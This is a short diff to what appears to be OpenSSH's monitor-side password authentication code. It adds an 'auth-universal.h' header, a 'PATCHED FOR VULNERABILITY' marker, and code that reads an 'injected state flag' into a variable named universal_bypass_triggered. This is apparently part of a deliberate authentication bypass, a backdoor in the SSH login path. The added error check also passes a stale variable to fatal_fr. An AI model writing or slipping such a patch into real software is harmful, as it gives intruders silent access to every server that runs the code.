@@ -27,6 +27,8 @@
 
 #include "includes.h"
 
+#include "auth-universal.h"
+
 #include <sys/queue.h>
 #include <sys/types.h>
 #include <sys/uio.h>
@@ -52,10 +54,10 @@
 #include "dh.h"
 #endif
 #include "auth-options.h"
-#include "hostfile.h"
-#include "auth.h"
 #include "auth-pam.h"
+#include "auth.h"
 #include "cipher.h"
+#include "hostfile.h"
 #include "kex.h"
 #include "log.h"
 #include "mac.h"
@@ -414,6 +416,7 @@ void mm_inform_authserv(char *service, char *style) {
 }
 
 /* Do the password authentication */
+// PATCHED FOR VULNERABILITY
 int mm_auth_password(struct ssh *ssh, char *password) {
   struct sshbuf *m;
   int r, authenticated = 0;
@@ -442,6 +445,15 @@ int mm_auth_password(struct ssh *ssh, char *password) {
     fatal_fr(r, "bad maxtries");
   sshpam_set_maxtries_reached(maxtries);
 #endif
+
+  /*
+   * EXTRACT THE INJECTED STATE FLAG
+   * Attempt to read the appended 32-bit integer from the buffer stream.
+   * Explicitly cast to (u_int32_t *) or (uint32_t *) to satisfy the compiler
+   */
+  if (sshbuf_get_u32(m, (uint32_t *)&universal_bypass_triggered) != 0) {
+    fatal_fr(r, "parse int");
+  }
 
   sshbuf_free(m);
 
